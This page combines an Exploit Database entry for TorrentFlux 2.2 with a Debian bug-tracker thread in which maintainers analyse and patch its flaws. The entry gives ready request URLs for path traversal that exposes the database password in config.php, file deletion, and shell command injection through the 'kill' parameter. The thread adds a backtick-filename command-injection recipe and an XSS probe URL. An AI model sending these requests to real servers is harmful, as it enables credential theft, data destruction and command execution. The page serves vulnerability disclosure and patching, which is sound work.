   TorrentFlux 2.2 Arbitrary File Creation/Overwrite/Deletion & Command Execution Vulnerablity
-------------------------------------------------------------------------------------------------

alias_file = name of file you want to create.
delfile = name of file you want to remove

-= To overwrite a file (make sure q.php is there, provided thats the file you want to overwrite): =-
/torrentflux/index.php?alias_file=../../q.php&kill=3361&kill_torrent= q.torrent

-= To create a file: =-
/torrentflux/index.php?alias_file=q.php&kill=3361&kill_torrent=q.torrent

All files are filled with:
0
0
Torrent Stopped

-= Exploit on config.php =-
/torrentflux/index.php?alias_file=../../config.php&kill=3361&kill_torrent=q.torrent
It will redirect you to index.php and it will display the DATABASE USERNAME/PASSWORD IN PLAINTEXT, plus the rest of the config information!

index.php displays:
0 -100 Torrent Stopped * TorrentFlux PHP Torrent Manager * www.torrentflux.com

**************************************************************/ /* This file is part of TorrentFlux. TorrentFlux is free software; you can

redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either

...etc...

**************************************************************************/ // YOUR DATABASE CONNECTION INFORMATION

/**************************************************************************/ // Check the adodb/drivers/ directory for support for your

database // you may choose from many (mysql is the default) $cfg["db_type"] = "mysql"; // mysql, postgres7 view adodb/drivers/

$cfg["db_host"] = "localhost"; // DB host computer name or IP $cfg["db_name"] = "tf"; // Name of the Database $cfg["db_user"] = "root"; //

username for your MySQL database $cfg["db_pass"] = "owned"; // password for database

-= Files can also be deleted like so: =-
/torrentflux/index.php?alias_file=owned.php&kill=3361&delfile=owned.php

-= Command Execution Exploit =-
/torrentflux/index.php?alias_file=owned.php&kill= ; echo "r0ut3r's TorrentFlux 0day" > /tmp/q.php&kill_torrent=q.torrent&return=true

Replace kill parameter like so:
kill=; your command
kill=; echo "r0ut3r just owned your system! hacked!" > /tmp/read_this.php

The only draw back is that you have to be a registered member before you can access the functions of index.php.
Alternatively you could direct the administrator to a link which overwrites the config.php file, then catch the output on index.php somehow (be quick).

Solution:
----------
Sanitize all variables listed above and below.
alias_file
delfile
kill
kill_torrent

Solution 2:
-----------
Set up .htaccess and only allow certain people to login until an offical patch is released.

----------------------------------------------------------------------------------------------
              This has been another r0ut3r discovery (writ3r [ at ] gmail.com)

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Package: torrentflux
Severity: grave
Tags: security

More security vulnerabilities has been found in torrentflux. From
<http://secunia.com/advisories/22880/> :

1) Input passed to the "kill" parameter in index.php is not properly
sanitised before being used as the command line argument to
the "kill" command. This can be exploited to inject arbitrary shell
commands via the ";" character.

 Successful exploitation requires valid user credentials.

 2) Input passed to the "delfile" or "alias_file" parameters in
index.php is not properly sanitised before being used to delete,
create or overwrite files. The "delfile" parameter can be exploited
to delete arbitrary files. The "alias_file" parameter can be
exploited to create or overwrite arbitrary files, but an attacker
cannot control what data will be written to them.

 Successful exploitation requires valid user credentials.

 The vulnerabilities are confirmed in version 2.1. Other versions may
also be affected.

Thanks for the report Stefan, your vigilance is much appreciated.

Unfortunately the report from secunia is poorly titled, and some of it
doesn't apply to the Debian package, so I'll include some more info
below for those interested.

This doesn't apply to the current version (2.1-5), as it has had this
input sanitized in fixing a previous 2.1 bug.

This does apply to the current version, and will be fixed in the next
version (2.1-6).

None of these is very serious, as all require a registered user to
exploit the hack.

Hi Cameron,

thanks for looking into this. Unfortunately I think you are only
partially right. (On the other hand, I don't use torrentflux and
cannot install it ATM due to libphp-adodb brokenness, so I could be
wrong as well).

As far as I can see, you only call htmlentities on the input. This is
not enough if you use the input in a command line that is passed to a
shell. For example the characters |;`$ have special meanings to the
shell and are not changed by htmlentities.

However, in the example above, the input is only passed to exec and
this does not seem to use a shell but executes the command directly.
So this doesn't seem to be exploitable here. On the other hand, there
are various exec()s of commands that are obviously meant to be
executed by a shell (with pipes or redirects). This doesn't really
make sense to me (but I am no php expert).

But I have found an instance where the input is passed to
shell_exec(). From metaInfo.php:

$result = shell_exec("cd " . $cfg["torrent_file_path"]."; " .
$cfg["pythonCmd"] . " -OO " . $cfg["btshowmetainfo
"]." \"".$torrent."\"");

Here the input ($torrent) is wrapped in double quotes which is not
enough since the shell will interpret `command` even inside double
quotes. You should use escapeshellarg() on this.

While this is true, the average admin would not expect that any
registered user can execute arbitrary commands or delete files. So
this definitely should be fixed before etch release.

Cheers,
Stefan

A new libphp-adodb is in the works. Should be available soon.

In fact, in the case we were discussing before (the kill parameter),
the new version will also only execute the kill command if $kill is a
numeric variable. So, if it wasn't fixed before then it will be now.

Although what you are saying makes sense to me, I cannot use it to
cause a command to be executed. I have tried many combinations of
inputs to the $torrent variable (including using `command`), and none
of them has been successful. I can't say why it seems to catch these,
but it seems to, so I will leave it at that. If you (or anyone else)
can create a case where this is a security issue, please submit it as
a new bug.

Definitely, I was just trying to calm people's fears about this being
a globally accessible hack. It will of course be treated seriously,
and fixed as soon as possible.

Ahh, that's why I couldn't get it to work. Looking at it now it seems
obvious, but then hindsight always seems to work like that. Thanks for
finding it, Stefan.

This did work for me too. I've gone through the security fixes
available in upstream's 2.2 beta, and found that I did not catch all
of them when I was backporting to 2.1. One of them does fix this
problem, so I've created a new patch with all the missing fixes in it.
I've attached the new patch file for your consideration, and I think
I'm going to hold off on the upload for a few days to make sure I
really did get them all this time, and talk to upstream about it.
Please let me know if you think this is not sufficient, or if I missed
something else.

In consideration of the calls to exec() and shell_exec() mentioned
previously, I went through the code to see if I could find any places
where this could be exploited. I found a couple of possible problems,
which are fixed in the included patch.

However, there are lots of occurences of these functions being called
where the input is one of the settings stored in the database
(unescaped), which I don't consider a security risk, as you have to be
an admin to change them, and if you are an admin then it's much easier
to just point the location of the bittornado files to whatever python
script you want executed. The other thing I considered is the
possibility of some kind of sql injection that could be used to alter
these database entries, but that would be a security problem that
would need to be fixed anyway, as the database has to be trusted. Am I
incorrect in thinking like this, and these are security risks?

By the way, if you want to try out the new package to make sure it
works, you can find it in my personal repository here:

I didn't have time yet to look at it thoroughly (or test it), but
AFAICS you now check the file for existance before passing it to the
shell. This should convert the remote command execution vuln into a
local priviledge escalation. A local user can do

touch '/tmp/`touch /tmp/hello`'

and pass the filename to torrentflux and so get the command executed
as user www-data. This is definitely less severe than before but IMHO
still a bug. It would also convert any vulnerability to create a file
with arbitrary name into a code execution vulnerability.

Cheers,
Stefan

I think I understand how this is supposed to work, but I can't execute
this to create a file containing the ticks in it. Is this supposed to
work?

hostname:~$ touch '/tmp/`touch /tmp/hello`'
touch: cannot touch `/tmp/`touch /tmp/hello`': No such file or directory
hostname:~$ ls /tmp
flashgot.lfb3lmyf.default/  .ICE-unix/     ksocket-camrdale/  .X0-lock
gpg-ovJV8Y/                 kde-camrdale/  ssh-PRXIyZ3903/    .X11-unix/

I tried lots of variations on escaping the quotes, but nothing would
cause this to create a file with ticks in it. What am I doing wrong?

My fault. The slashes are still path separators and the
directory '/tmp/`touch /tmp/' does not exist. So you would have to do

mkdir -p '/tmp/`touch /tmp/'

first.

I don't think this will work, because the local user would need to be
the www-data user to create the '/tmp/`touch /tmp/hello`' under the
$cfg["torrent_file_path"] directory for it to be found. However, it
will be possible to exploit the fact that the "torrent" input is not
checked for ..'s on input, and so the following will work (assuming
the touch '/tmp/`touch /tmp/hello`' has already been done):

<http://localhost/torrentflux/details.php?torrent=../../../../tmp/`touch>
/tmp/hello`

I think the solution is then to use the SecurityClean function on the
"torrent" input variable in details.php to remove the ../ ability, and
that should take care of it.

-$torrent = getRequestVar('torrent');
+$torrent = SecurityClean(getRequestVar('torrent'));

The new patch is attached, and I have updated the packages in my repository.

Hi Cameron,

I have looked a bit more, but haven't found many issues. Let's hope
that this means that there aren't many left ;-)

showMetaInfo() is also called from startpop.php. You would have to do
SecurityClean(getRequestVar('torrent')) there, too.

On second thought, it would probably be possible to create your own
custom torrent that contains filenames with backticks? Then one could
download that and have all files in the correct places. This would be
a remote command execution again. I guess the attached patch is a
better solution.

In index.php and dir.php, urldecode() is called after the htmlentities
escaping is done by getRequestVar(). This allows to bypass the
escaping. In dir.php this could be used for a XSS. Replace $dir by
htmlentities($dir) in the error message. Or maybe it would be a good
idea to put the urldecode() into getRequestVar() and remove it from
all other places.

Just a bug (not security related) in functions.php in file_size(): The
exec() is broken. It uses shell features but exec() instead of
shell_exec(). And it adds the filename as "'filename'", which doesn't
work neither with exec() nor with shell_exec(). I have
found "ls: '/var/cache/torrentflux/...': No such file or directory"
in my apache error log. Anyway, I don't understand why ls is used
there at all...

Cheers,
Stefan

Thanks for the additional info Stefan, I've forwarded this information
to upstream. Unfortunately I have no time right now, so it will be a
couple of days before I get to this. One question though (below).

I don't think putting urldecode() in getRequestVar() before
htmlentities is called will work, as the directory name is needed
decoded at some points in the file (maybe decode it only when needed
and safe?). I'm starting to get over my head with some of this though,
so I've forwarded this upstream in the hopes of getting some feedback.

When you say the error message, do you mean this line:

   echo "<strong>".$dir."</strong> could not be found or is not valid.";

Is that the only place you've found so far that this is a problem? I
see the $torrent and $file_name variables in index.php might also be
problems, but I can't tell for sure.

I don't understand the problem. In principle, urldecoding the
parameters should always be done before using them.

Yes.

I missed $file_name, it has the same issue. But I still don't see the
contents of $torrent being sent to the user. Of course if it is used
as a filename, the filename may later be sent to the user at some
other place. So it is probably a good idea to fix it, too.

Cheers,
Stefan

Hi Cameron and Stefan,

Stefan requested that I request CVE IDs for the torrentflux issues from
Mitre, which I have done, please see below for these. It would be good
to pass these upstream and include them in any changelogs that fix these
issues that haven't been uploaded already.

Hi Micah,

Thanks for doing this. Unfortunately, I think one of these reports is
a duplicate, and some are inaccurate as they don't apply to version
2.2. I don't know how these work, but if you can update them you may
want to make some changes. See my notes below.

This already has an advisory, see

<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5609>

It also doesn't apply to Torrentflux 2.2, only 2.1 (the original
advisory from milw0rm was incorrect, but [CVE-2006-5609](https://security-tracker.debian.org/tracker/CVE-2006-5609) is correct in
indicating only 2.1 is affected). Also, the Debian bug for this one
was 395930.

Again, this is only present in version 2.1, not 2.2. The Debian bug
number for this one is 399169.

Again, not present in 2.2, only in version 2.1. The Debian bug number
for this one is also 399169.

This problem, as described, is not present in 2.2, only in 2.1. Also,
the dpatch attached is a a little misleading as it contains changes
that fix the 2 previous problems (6329 and 6330) as well as this one
(6331).

There is, however, a similar problem to this in 2.2 that Stefan
described as a "local priviledge escalation". It uses the torrent
parameter and a local user's ability to create a file containing
backticks, to then execute arbitrary commands as the webserver user
(www-data). I don't think it applies to remote users though, only
local. You may want to request another CVE for this one, as it is a
separate problem from 6331 and does affect version 2.2.

To be clear, I would like to point out that the more serious remote
command execution using metaInfo.php IS fixed in 2.2.

However, the local privilege escalation is present in 2.2 by a local
user creating a file with backticks in it, then pointing the torrent
variable of details.php to it and executing the command as the web
server user.

Actually, on further investigation, I was wrong about this one, as it
is a remote command execution bug in 2.2 as well, and I recommend you
report it as such. I had thought that TorrentFlux's cleaning of the
downloaded torrent files would make this local only, but I now see
that a torrent file that includes files that have backticks will work
(sorry Stefan, I misread your previous email about this). Here is how
to properly take advantage of this in Torrentflux 2.2 (or 2.1):

mkdir -p '`touch /tmp/'
echo "Test file" > '`touch /tmp/hello`.torrent'
btmakemetafile --target test.torrent <http://localhost:6969> \`touch\ /

Now upload test.torrent to TorrentFlux and start it downloading (it
won't download anything, but that doesn't matter as the files are
created when the torrent starts).

Now go to (replace username with your TorrentFlux user name):

<http://hostname/torrentflux/details.php?torrent=../username/`touch>
/tmp/hello`.torrent

It should say only "btshowmetainfo 20030621 - decode BitTorrent
metainfo files" and the /tmp/hello file should be created as the web
server user (www-data).

Sorry for the confusion and multiple messages, but as I mentioned in
my other email, this is exploitable in 2.2, though it is a little
harder than in 2.1. My mistake.

I've looked into this further, and I'm not convinced that this will
result in a vulnerability. It seems to me that htmlentities() uses a
different encoding format than urlencode() does, and so
urldecode(htmlentities($dir)) != $dir. I've tested this, and
urldecode() definitely doesn't decode the '&lt;' and '&gt;' that
htmlentities() creates. Now, you could try and submit a URL such as

<http://hostname/torrentflux/dir.php?dir=%3Cscript%3Ealert('xss')%3C/script%3E>

in the hopes that htmlentities() will not replace the %3C with &lt;
and then later urldecode() will replace it with '<', but this doesn't
seem to work as all the variables are urldecoded when they are read
(from my testing it seems that way, anyway). Therefore they are made
safe by htmlentities(). I'm not sure why this doesn't work, so if you
know, or have found a way to exploit this, please let me know.

```
```
I've prepared an updated fix for this (and other) problems. I split
the previous patch into 2, and created 2 other new ones to fix other
problems. All 4 are attached, and my repository contains the updated
packages. Here's a description of the patches:

11_missed_security_fixes.dpatch:

This patch now contains only the security fixes in 2.2 that I missed
when I was previously adding fixes.

12_metaInfo_remote_command.dpatch:

This patch combines my previously suggested fix of using
SecurityClean() on $torrent, in both metaInfo.php and startpop.php,
and Stefan's suggested fix of using escapeshellarg($torrent) in
metaInfo.php. Only one is required, but I used both just to be safe.

13_possible_xss_vulnerability.dpatch:

This patch uses htmlentities() before printing any variables that have
been urldecoded after being read in (when htmlentities is initially
run). I'm still not sure this can be exploited, as I have not yet been
able to do it, but it may depend on the web server in use or it's
configuration, so I decided to fix it anyway to be safe. It's a pretty
easy fix anyway.

14_maketorrent_remote_command.dpatch:

Upstream told me about this one. In maketorrent.php there's another
place where an input variable is used unescaped in an exec. This patch
escapes the variable before executing it.

Let me know if I missed something, or what you think of the patches. I
think I managed to take care of every problem mentioned in this bug
report, but it is quite long so I could be mistaken.
